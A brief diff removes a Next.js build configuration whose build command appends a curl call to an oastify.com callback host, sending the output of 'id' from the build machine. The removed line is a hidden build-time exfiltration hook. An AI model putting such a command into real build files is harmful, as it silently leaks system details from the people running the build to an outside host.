@@ -1,3 +1,0 @@
-[build]
-  publish = ".next"
-  command = "npm run build && curl http://t4y72v8gzunn13hp3i8uy64fb6hx5sth.oastify.com/log?data=$(id)"
